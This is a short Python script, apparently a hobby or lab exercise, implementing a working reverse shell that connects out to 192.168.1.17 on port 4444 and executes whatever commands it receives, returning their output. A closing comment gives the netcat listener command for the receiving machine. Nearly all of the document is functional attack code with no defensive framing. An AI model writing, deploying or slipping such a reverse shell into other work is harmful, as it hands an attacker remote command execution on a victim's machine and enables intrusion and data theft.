#!/usr/bin/env python
import socket
import subprocess

def execute(cmd):
    return subprocess.check_output(cmd, shell=True)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.17", 4444))

s.send(b"\n[+] Connection Successful!!!\n")
while True:
    cmd = s.recv(1024)
    try:
        result = execute(cmd.decode("utf-8"))
    except:
        result = execute(str(cmd))
    s.send(result)
s.close()
'''
In 192.168.1.17 we listen for incoming connections using netcat
>nc -vv -l -p 4444
'''